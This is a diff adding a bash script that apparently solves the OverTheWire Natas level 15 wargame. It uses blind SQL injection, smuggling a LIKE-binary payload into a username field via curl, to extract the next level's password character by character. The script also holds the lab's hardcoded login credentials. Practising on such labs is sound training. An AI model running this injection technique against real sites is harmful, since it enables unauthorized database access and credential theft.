@@ -1,0 +1,45 @@
+#!/bin/bash
+
+main () 
+{
+	char="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+	pass=""
+
+	for i in $(seq 1 32)
+	do
+		for c in $(fold -w1 <<< $char)
+		do
+			r=$(check "$pass$c")
+			# echo $r;
+			echo -en "password: $pass$c" "\r"
+			if [ "yes" = "$r" ]; then
+				pass="$pass$c"	
+				break
+			fi
+			# echo $c $i
+		done
+		# break
+	done
+
+
+	echo "password: $pass"
+}
+
+check ()
+{
+
+	result=$(curl --user natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J http://natas15.natas.labs.overthewire.org --data "username=natas16\" and password LIKE binary \"$1%\" -- " 2>&1 | grep "This user" | cut -d . -f1)	
+
+	# echo $result
+	if [ "$result" = "This user exists" ]; then
+		echo "yes"
+	elif [ "$result" = "This user doesn't exist" ]; then
+		echo "no"
+	else
+		echo $result
+	fi
+}
+
+main
+
+#check "N"
